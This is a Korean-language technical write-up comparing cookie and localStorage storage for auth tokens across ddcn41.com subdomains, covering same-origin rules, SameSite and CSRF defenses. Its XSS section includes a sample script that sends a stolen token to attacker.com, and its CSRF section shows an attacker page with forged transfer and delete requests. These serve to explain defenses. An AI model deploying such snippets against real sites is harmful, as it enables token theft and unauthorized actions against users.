<p><strong>WAF (Web Application Firewall) 규칙</strong>:</p>
<pre><code class="lang-yaml"><span class="hljs-attr">ddcn41.com:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">Rate Limiting:</span> <span class="hljs-number">1000 </span><span class="hljs-string">req/min</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">IP Whitelist:</span> <span class="hljs-string">없음</span>

<span class="hljs-attr">admin.ddcn41.com:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">Rate Limiting:</span> <span class="hljs-number">100</span> <span class="hljs-string">req/min</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">IP Whitelist:</span> <span class="hljs-string">회사</span> <span class="hljs-string">IP만</span> <span class="hljs-string">허용</span>
</code></pre>
<hr></hr>
<h2 id="인증-저장소-비교-쿠키-vs-로컬스토리지">인증 저장소 비교: 쿠키 vs 로컬스토리지</h2>
<h3 id="1-저장소-특성-비교">1. 저장소 특성 비교</h3>
<table>
<thead>
<tr>
<th>특성</th>
<th>쿠키</th>
<th>로컬스토리지</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>저장 위치</strong></td>
<td>브라우저 쿠키 저장소</td>
<td>브라우저 Web Storage</td>
</tr>
<tr>
<td><strong>용량</strong></td>
<td>~4KB</td>
<td>~5-10MB</td>
</tr>
<tr>
<td><strong>자동 전송</strong></td>
<td>HTTP 요청 시 자동 포함</td>
<td>수동으로 헤더에 추가 필요</td>
</tr>
<tr>
<td><strong>유효기간</strong></td>
<td><code>Max-Age</code>, <code>Expires</code> 설정 가능</td>
<td>명시적으로 삭제 전까지 영구</td>
</tr>
<tr>
<td><strong>Same-Origin Policy</strong></td>
<td>서브도메인 간 공유 가능 (<code>Domain</code> 설정)</td>
<td>정확히 같은 Origin만 접근 가능</td>
</tr>
<tr>
<td><strong>HttpOnly 지원</strong></td>
<td>✅ 지원 (JS 접근 불가)</td>
<td>❌ 지원 안 함 (JS 접근 필수)</td>
</tr>
<tr>
<td><strong>Secure 플래그</strong></td>
<td>✅ HTTPS 전용 설정 가능</td>
<td>❌ 지원 안 함</td>
</tr>
</tbody>
</table>
<h3 id="2-same-origin-policy-차이">2. Same-Origin Policy 차이</h3>
<h4 id="로컬스토리지-엄격한-same-origin">로컬스토리지: 엄격한 Same-Origin</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// accounts.ddcn41.com에서 저장</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'access_token'</span>, <span class="hljs-string">'eyJhbGc...'</span>);

<span class="hljs-comment">// ddcn41.com에서 접근 시도</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'access_token'</span>));
<span class="hljs-comment">// → null (다른 Origin이므로 접근 불가)</span>

<span class="hljs-comment">// admin.ddcn41.com에서 접근 시도</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'access_token'</span>));
<span class="hljs-comment">// → null (다른 Origin이므로 접근 불가)</span>
</code></pre>
<p><strong>Origin 비교</strong>:</p>
<pre><code>https://ddcn41.com          → Origin 1
https://accounts.ddcn41.com → Origin 2 (다름)
https://admin.ddcn41.com    → Origin 3 (다름)

→ 각 Origin의 로컬스토리지는 완전히 독립적
</code></pre><p><strong>로컬 개발 환경에서의 포트 격리</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// localhost에서 포트가 다르면 완전히 다른 Origin</span>
<span class="hljs-attr">http</span>:<span class="hljs-comment">//localhost:3000  → Origin A</span>
<span class="hljs-attr">http</span>:<span class="hljs-comment">//localhost:3001  → Origin B (완전히 다름)</span>
<span class="hljs-attr">http</span>:<span class="hljs-comment">//localhost:3002  → Origin C (완전히 다름)</span>

<span class="hljs-comment">// 실제 예시</span>
<span class="hljs-comment">// localhost:3000 (클라이언트)에서 저장</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'access_token'</span>, <span class="hljs-string">'eyJhbGc...'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'access_token'</span>));
<span class="hljs-comment">// → "eyJhbGc..." (정상 출력)</span>

<span class="hljs-comment">// localhost:3001 (어드민)에서 접근 시도</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'access_token'</span>));
<span class="hljs-comment">// → null (접근 불가)</span>

<span class="hljs-comment">// localhost:3002 (어카운트)에서 접근 시도</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'access_token'</span>));
<span class="hljs-comment">// → null (접근 불가)</span>

<span class="hljs-title class_">Origin</span> 구성 요소:
  - 프로토콜 (http/https)
  - 호스트 (localhost, ddcn41.<span class="hljs-property">com</span>)
  - 포트 (<span class="hljs-number">3000</span>, <span class="hljs-number">3001</span>, <span class="hljs-number">3002</span>)

→ 세 요소 중 하나라도 다르면 다른 <span class="hljs-title class_">Origin</span>
→ 로컬스토리지는 <span class="hljs-title class_">Origin</span> 단위로 완전히 격리됨
</code></pre>
<p><strong>Same-Origin 판정 규칙</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// ✅ 같은 Origin (로컬스토리지 공유 가능)</span>
<span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com:443</span>
<span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com           // 포트 생략 시 기본 443</span>

<span class="hljs-attr">http</span>:<span class="hljs-comment">//localhost:3000</span>
<span class="hljs-attr">http</span>:<span class="hljs-comment">//localhost:3000/admin  // Path는 Origin에 포함 안 됨</span>

<span class="hljs-comment">// ❌ 다른 Origin (로컬스토리지 공유 불가)</span>
<span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com</span>
<span class="hljs-attr">http</span>:<span class="hljs-comment">//ddcn41.com            // 프로토콜 다름</span>

<span class="hljs-attr">http</span>:<span class="hljs-comment">//localhost:3000</span>
<span class="hljs-attr">http</span>:<span class="hljs-comment">//localhost:3001        // 포트 다름</span>

<span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com</span>
<span class="hljs-attr">https</span>:<span class="hljs-comment">//accounts.ddcn41.com  // 호스트 다름 (서브도메인도 별개)</span>

<span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com:443</span>
<span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com:8443      // 포트 다름</span>
</code></pre>
<p><strong>로컬 개발의 문제점</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// 문제 상황</span>
로컬 환경:
  <span class="hljs-attr">localhost</span>:<span class="hljs-number">3000</span> → 클라이언트 (<span class="hljs-title class_">Vite</span>)
  <span class="hljs-attr">localhost</span>:<span class="hljs-number">3001</span> → 어드민 (<span class="hljs-title class_">Vite</span>)
  <span class="hljs-attr">localhost</span>:<span class="hljs-number">3002</span> → 어카운트 (<span class="hljs-title class_">Vite</span>)

<span class="hljs-comment">// accounts (localhost:3002)에서 로그인 성공</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'auth_tokens'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
  <span class="hljs-attr">accessToken</span>: <span class="hljs-string">'eyJhbGc...'</span>,
  <span class="hljs-attr">refreshToken</span>: <span class="hljs-string">'eyJhbGc...'</span>
}));

<span class="hljs-comment">// 클라이언트 (localhost:3000)로 이동</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'http://localhost:3000'</span>;

<span class="hljs-comment">// ❌ 문제: 토큰이 공유되지 않음</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'auth_tokens'</span>));
<span class="hljs-comment">// → null (다른 Origin이므로 접근 불가)</span>

<span class="hljs-comment">// 해결 방법:</span>
<span class="hljs-comment">// 1. 쿠키 사용 (Domain=localhost 설정)</span>
<span class="hljs-comment">// 2. Nginx Reverse Proxy로 단일 도메인 구성</span>
<span class="hljs-comment">// 3. Bearer Token 방식 (로그인 후 URL에 토큰 전달)</span>
</code></pre>
<h4 id="쿠키-서브도메인-간-공유-가능">쿠키: 서브도메인 간 공유 가능</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// accounts.ddcn41.com에서 쿠키 설정 (Lambda 응답)</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: access_token=eyJhbGc...; <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>; <span class="hljs-title class_">HttpOnly</span>; <span class="hljs-title class_">Secure</span>;

<span class="hljs-comment">// ddcn41.com에서 자동 전송</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.ddcn41.com/v1/bookings'</span>)
<span class="hljs-comment">// → Cookie: access_token=eyJhbGc... (브라우저가 자동으로 포함)</span>

<span class="hljs-comment">// admin.ddcn41.com에서도 자동 전송</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.ddcn41.com/v1/admin/users'</span>)
<span class="hljs-comment">// → Cookie: access_token=eyJhbGc... (브라우저가 자동으로 포함)</span>
</code></pre>
<p><strong>Domain 설정 규칙 (RFC 6265 기준)</strong>¹:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// accounts.ddcn41.com에서 설정 가능한 Domain:</span>

<span class="hljs-comment">// 1. 서브도메인 공유 (권장)</span>
<span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>          ✅ 가능 (모든 *.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>에서 공유)
<span class="hljs-title class_">Domain</span>=ddcn41.<span class="hljs-property">com</span>           ✅ 가능 (.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>과 동일하게 동작)
  → <span class="hljs-variable constant_">RFC</span> <span class="hljs-number">6265</span>: leading <span class="hljs-title function_">dot</span>(.)은 무시됨
  → 현대 브라우저에서는 두 방식 모두 서브도메인 공유

<span class="hljs-comment">// 2. 특정 도메인만 (Domain 생략 또는 명시)</span>
(<span class="hljs-title class_">Domain</span> 생략)              ✅ 가능 (accounts.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>만, 서브도메인 제외)
<span class="hljs-title class_">Domain</span>=accounts.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>  ✅ 가능 (accounts.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span> + 하위 서브도메인)

<span class="hljs-comment">// 3. 다른 도메인 설정 불가</span>
<span class="hljs-title class_">Domain</span>=.<span class="hljs-property">example</span>.<span class="hljs-property">com</span>         ❌ 불가 (다른 도메인)
<span class="hljs-title class_">Domain</span>=google.<span class="hljs-property">com</span>           ❌ 불가 (다른 도메인)


<span class="hljs-comment">// 참고: RFC 6265 이전 (RFC 2109)과의 차이</span>
<span class="hljs-comment">// - RFC 2109 (구 스펙): .ddcn41.com만 서브도메인 공유</span>
<span class="hljs-comment">// - RFC 6265 (현재): .ddcn41.com과 ddcn41.com 모두 서브도메인 공유</span>
</code></pre>
<blockquote>
<p>¹ 참조: <a href="https://datatracker.ietf.org/doc/html/rfc6265" target="_blank">RFC 6265: HTTP State Management Mechanism</a></p>
</blockquote>
<h3 id="3-보안-측면-비교">3. 보안 측면 비교</h3>
<h4 id="xss-cross-site-scripting-공격-시나리오">XSS (Cross-Site Scripting) 공격 시나리오</h4>
<p><strong>로컬스토리지 (취약)</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// 악성 스크립트가 페이지에 삽입된 경우</span>
&lt;script&gt;
  <span class="hljs-comment">// ❌ 로컬스토리지는 JS로 직접 접근 가능</span>
  <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'access_token'</span>);

  <span class="hljs-comment">// 공격자 서버로 토큰 전송</span>
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://attacker.com/steal'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ token })
  });
&lt;/script&gt;
</code></pre>
<p><strong>쿠키 with HttpOnly (안전)</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// 악성 스크립트가 페이지에 삽입된 경우</span>
&lt;script&gt;
  <span class="hljs-comment">// ✅ HttpOnly 쿠키는 JS로 접근 불가</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);
  <span class="hljs-comment">// → "" (빈 문자열, access_token은 보이지 않음)</span>

  <span class="hljs-comment">// ❌ 공격자가 토큰을 훔칠 수 없음</span>
&lt;/script&gt;
</code></pre>
<p><strong>HttpOnly 쿠키 설정</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// Lambda Auth Gateway 응답</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: access_token=eyJhbGc...;
            <span class="hljs-title class_">HttpOnly</span>;         <span class="hljs-comment">// JS 접근 차단</span>
            <span class="hljs-title class_">Secure</span>;           <span class="hljs-comment">// HTTPS 전용</span>
            <span class="hljs-title class_">SameSite</span>=<span class="hljs-title class_">Lax</span>;     <span class="hljs-comment">// CSRF 완화</span>
            <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>;
            <span class="hljs-title class_">Path</span>=/;
            <span class="hljs-title class_">Max</span>-<span class="hljs-title class_">Age</span>=<span class="hljs-number">3600</span>
</code></pre>
<h4 id="csrf-cross-site-request-forgery-공격과-samesite-방어²">CSRF (Cross-Site Request Forgery) 공격과 SameSite 방어²</h4>
<p><strong>CSRF란?</strong></p>
<p>사용자가 의도하지 않은 요청을 악성 사이트가 대신 실행하는 공격입니다.</p>
<p><strong>CSRF 공격 시나리오</strong>:</p>
<pre><code class="lang-html"><span class="hljs-comment">&lt;!-- 악성 사이트 (attacker.com) --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 사용자가 ddcn41.com에 로그인된 상태라고 가정 --&gt;</span>

  <span class="hljs-comment">&lt;!-- 시나리오 1: 이미지 태그를 이용한 GET 요청 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://api.ddcn41.com/v1/bookings/cancel?id=123"</span> /&gt;</span>
  <span class="hljs-comment">&lt;!-- 브라우저가 자동으로 쿠키 전송 → 예약 취소 요청 --&gt;</span>

  <span class="hljs-comment">&lt;!-- 시나리오 2: 자동 제출 폼 (POST 요청) --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"evil"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"https://api.ddcn41.com/v1/account/transfer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"to"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"attacker_account"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"amount"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"1000000"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'evil'</span>).<span class="hljs-title function_">submit</span>();
    <span class="hljs-comment">// 사용자 모르게 자동 제출 → 송금 요청</span>
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

  <span class="hljs-comment">&lt;!-- 시나리오 3: Fetch API 이용 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.ddcn41.com/v1/users/delete'</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>  <span class="hljs-comment">// 쿠키 자동 포함</span>
    });
    <span class="hljs-comment">// 사용자 계정 삭제 요청</span>
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><strong>공격이 성립하는 조건</strong>:</p>
<ol>
<li>✅ 사용자가 ddcn41.com에 로그인된 상태 (쿠키 존재)</li>
<li>✅ 브라우저가 자동으로 쿠키를 Cross-Site 요청에 포함</li>
<li>✅ 서버가 요청의 출처를 검증하지 않음</li>
</ol>
<p><strong>SameSite 속성으로 방어</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// SameSite=Strict (가장 엄격)</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: token=abc; <span class="hljs-title class_">SameSite</span>=<span class="hljs-title class_">Strict</span>

동작:
  - <span class="hljs-title class_">Same</span>-<span class="hljs-title class_">Site</span> 요청만 쿠키 전송 (ddcn41.<span class="hljs-property">com</span> → api.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span> ✅)
  - <span class="hljs-title class_">Cross</span>-<span class="hljs-title class_">Site</span> 요청은 쿠키 전송 안 됨 (attacker.<span class="hljs-property">com</span> → api.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span> ❌)
  - 모든 <span class="hljs-variable constant_">HTTP</span> 메서드에 적용 (<span class="hljs-variable constant_">GET</span>, <span class="hljs-variable constant_">POST</span>, <span class="hljs-variable constant_">PUT</span>, <span class="hljs-variable constant_">DELETE</span>)

단점:
  - 외부 사이트에서 링크 클릭 시에도 쿠키 안 보냄
  - 예) <span class="hljs-title class_">Google</span> 검색 → ddcn41.<span class="hljs-property">com</span> 클릭 시 로그인 풀림
  - 사용자 경험 저하 가능

<span class="hljs-comment">// SameSite=Lax (권장, 균형잡힌 보호)</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: token=abc; <span class="hljs-title class_">SameSite</span>=<span class="hljs-title class_">Lax</span>

동작:
  - <span class="hljs-string">"안전한"</span> <span class="hljs-title class_">Cross</span>-<span class="hljs-title class_">Site</span> <span class="hljs-variable constant_">GET</span> 요청만 쿠키 전송
  - <span class="hljs-title class_">Top</span>-level <span class="hljs-title class_">Navigation</span> (링크 클릭, <span class="hljs-number">302</span> 리다이렉트)은 허용
  - <span class="hljs-variable constant_">POST</span>, <span class="hljs-variable constant_">PUT</span>, <span class="hljs-variable constant_">DELETE</span> 등 상태 변경 요청은 차단

허용되는 경우:
  ✅ &lt;a href=<span class="hljs-string">"https://ddcn41.com"</span>&gt;링크&lt;/a&gt; 클릭
  ✅ <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">"https://ddcn41.com"</span>
  ✅ <span class="hljs-number">302</span> <span class="hljs-title class_">Redirect</span> → <span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com</span>

차단되는 경우 (<span class="hljs-variable constant_">CSRF</span> 방어):
  ❌ &lt;form method=<span class="hljs-string">"POST"</span> action=<span class="hljs-string">"https://api.ddcn41.com/v1/transfer"</span>&gt;
  ❌ &lt;img src=<span class="hljs-string">"https://api.ddcn41.com/v1/bookings/cancel?id=123"</span>&gt;
  ❌ <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.ddcn41.com/v1/users/delete'</span>, {<span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>})
  ❌ &lt;iframe src=<span class="hljs-string">"https://ddcn41.com"</span>&gt; 내부에서의 <span class="hljs-variable constant_">POST</span> 요청

장점:
  - <span class="hljs-variable constant_">CSRF</span> 공격의 <span class="hljs-number">90</span>% 이상 차단 (상태 변경 요청 보호)
  - 사용자 경험 유지 (외부 링크에서 로그인 상태 유지)
  - 대부분의 웹 애플리케이션에 적합

<span class="hljs-comment">// SameSite=None (제한 없음, CSRF 취약)</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: token=abc; <span class="hljs-title class_">SameSite</span>=<span class="hljs-title class_">None</span>; <span class="hljs-title class_">Secure</span>

동작:
  - 모든 <span class="hljs-title class_">Cross</span>-<span class="hljs-title class_">Site</span> 요청에 쿠키 전송
  - <span class="hljs-title class_">Secure</span> 플래그 필수 (<span class="hljs-variable constant_">HTTPS</span> only)
  - <span class="hljs-variable constant_">CSRF</span> 공격에 취약

사용 사례:
  - iframe 내부 인증 (예: 결제 위젯 내부 로그인)
  - <span class="hljs-title class_">Third</span>-party 인증 (예: <span class="hljs-title class_">OAuth</span> 프로바이더)
  - <span class="hljs-title class_">Cross</span>-<span class="hljs-title class_">Site</span> 임베드 컨텐츠

⚠️ 주의: <span class="hljs-title class_">SameSite</span>=<span class="hljs-title class_">None</span> 사용 시 추가 <span class="hljs-variable constant_">CSRF</span> 방어 필수
  - <span class="hljs-variable constant_">CSRF</span> 토큰 검증
  - <span class="hljs-title class_">Referer</span>/<span class="hljs-title class_">Origin</span> 헤더 검증
  - <span class="hljs-title class_">Custom</span> 헤더 요구 (X-<span class="hljs-title class_">Requested</span>-<span class="hljs-title class_">With</span>)
</code></pre>
<blockquote>
<p>² 참조: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">OWASP CSRF Prevention Cheat Sheet</a>, <a href="https://web.dev/articles/samesite-cookies-explained" target="_blank">SameSite Cookies Explained</a></p>
</blockquote>
<p><strong>우리 프로젝트의 SameSite 설정 이유</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: access_token=eyJhbGc...;
            <span class="hljs-title class_">SameSite</span>=<span class="hljs-title class_">Lax</span>;  <span class="hljs-comment">// ← 이 값을 선택한 이유</span>

이유:
<span class="hljs-number">1.</span> ✅ <span class="hljs-variable constant_">CSRF</span> 방어: <span class="hljs-variable constant_">POST</span>/<span class="hljs-variable constant_">PUT</span>/<span class="hljs-variable constant_">DELETE</span> 요청은 <span class="hljs-title class_">Same</span>-<span class="hljs-title class_">Site</span>만 허용
   → 악성 사이트에서 송금, 삭제 등 위험한 요청 불가

<span class="hljs-number">2.</span> ✅ 사용자 경험: 외부 링크 클릭 시 로그인 유지
   → <span class="hljs-title class_">Google</span> 검색 → ddcn41.<span class="hljs-property">com</span> 클릭 → 로그인 상태 유지

<span class="hljs-number">3.</span> ✅ <span class="hljs-variable constant_">API</span> 호출 정상 동작: ddcn41.<span class="hljs-property">com</span> → api.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span> (<span class="hljs-title class_">Same</span>-<span class="hljs-title class_">Site</span>)
   → 모든 서브도메인이 .<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>으로 같은 <span class="hljs-title class_">Site</span>

<span class="hljs-number">4.</span> ✅ 브라우저 기본값 준수: <span class="hljs-number">2020</span>년 이후 브라우저 기본값이 <span class="hljs-title class_">Lax</span>
   → 명시적으로 설정하여 예측 가능한 동작 보장
</code></pre>
<p><strong>CSRF 추가 방어 계층</strong> (SameSite만으로 부족한 경우):</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// 1. CSRF 토큰 검증 (Double Submit Cookie 패턴)</span>
<span class="hljs-comment">// Lambda에서 CSRF 토큰 발급</span>
<span class="hljs-keyword">const</span> csrfToken = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">'hex'</span>);
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: csrf_token=${csrfToken}; <span class="hljs-title class_">SameSite</span>=<span class="hljs-title class_">Lax</span>; <span class="hljs-title class_">HttpOnly</span>;

<span class="hljs-comment">// Frontend에서 POST 요청 시 토큰 포함</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/v1/transfer'</span>, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'X-CSRF-Token'</span>: csrfToken  <span class="hljs-comment">// 쿠키의 토큰과 일치 검증</span>
  },
  <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>
});

<span class="hljs-comment">// 2. Origin/Referer 헤더 검증</span>
<span class="hljs-comment">// Backend에서 요청 출처 확인</span>
<span class="hljs-keyword">const</span> allowedOrigins = [<span class="hljs-string">'https://ddcn41.com'</span>, <span class="hljs-string">'https://admin.ddcn41.com'</span>];
<span class="hljs-keyword">if</span> (!allowedOrigins.<span class="hljs-title function_">includes</span>(request.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>)) {
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">statusCode</span>: <span class="hljs-number">403</span>, <span class="hljs-attr">body</span>: <span class="hljs-string">'Forbidden'</span> };
}

<span class="hljs-comment">// 3. Custom 헤더 요구 (Simple Request 방지)</span>
<span class="hljs-comment">// CORS Preflight를 강제하여 Cross-Site 요청 차단</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/v1/transfer'</span>, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'X-Requested-With'</span>: <span class="hljs-string">'XMLHttpRequest'</span>  <span class="hljs-comment">// Custom 헤더 → Preflight 발생</span>
  }
});
</code></pre>
<h4 id="https와-보안">HTTPS와 보안</h4>
<p><strong>과거 (HTTP 시대)</strong>:</p>
<pre><code>사용자 → HTTP → 서버
       ↓
   쿠키 헤더 평문 노출
   Cookie: session_id=abc123
       ↓
   중간자 공격 (MITM) 가능
   → 세션 하이재킹
</code></pre><p><strong>현재 (HTTPS + Secure 플래그)</strong>:</p>
<pre><code>사용자 → HTTPS (TLS 암호화) → 서버
       ↓
   쿠키 헤더 암호화
   Cookie: access_token=eyJhbGc... (암호화됨)
       ↓
   Secure 플래그: HTTP로는 전송 안 됨
   → 중간자 공격 방어
</code></pre><h3 id="4-msa-환경에서의-실용성">4. MSA 환경에서의 실용성</h3>
<h4 id="시나리오-로그인-후-서비스-간-인증-정보-공유">시나리오: 로그인 후 서비스 간 인증 정보 공유</h4>
<p><strong>로컬스토리지 방식 (복잡하고 불안전)</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// 1. accounts.ddcn41.com에서 로그인 성공</span>
<span class="hljs-keyword">const</span> tokens = {
  <span class="hljs-attr">accessToken</span>: <span class="hljs-string">'eyJhbGc...'</span>,
  <span class="hljs-attr">refreshToken</span>: <span class="hljs-string">'eyJhbGc...'</span>
};
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'auth_tokens'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(tokens));

<span class="hljs-comment">// 2. ddcn41.com으로 이동하려면...</span>
<span class="hljs-comment">// → 로컬스토리지는 공유 안 되므로 토큰 전달 필요</span>

<span class="hljs-comment">// 방법 A: URL 쿼리 파라미터 (❌ 매우 위험)</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">`https://ddcn41.com?token=<span class="hljs-subst">${accessToken}</span>`</span>;
<span class="hljs-comment">// → 브라우저 히스토리, 서버 로그에 토큰 노출</span>

<span class="hljs-comment">// 방법 B: 302 Redirect + 서버 중계 (⚠️ 복잡)</span>
<span class="hljs-comment">// accounts.ddcn41.com/redirect-with-token</span>
<span class="hljs-variable constant_">POST</span> /redirect-<span class="hljs-keyword">with</span>-token
<span class="hljs-title class_">Body</span>: { <span class="hljs-attr">token</span>: <span class="hljs-string">'eyJhbGc...'</span>, <span class="hljs-attr">redirectTo</span>: <span class="hljs-string">'https://ddcn41.com'</span> }

<span class="hljs-comment">// 서버 응답</span>
<span class="hljs-number">302</span> <span class="hljs-title class_">Found</span>
<span class="hljs-title class_">Location</span>: <span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com/receive-token?code=temp_code</span>

<span class="hljs-comment">// ddcn41.com에서 temp_code로 토큰 교환</span>
<span class="hljs-variable constant_">GET</span> /receive-token?code=temp_code
→ 서버에서 temp_code 검증 후 토큰 반환
→ 로컬스토리지에 저장

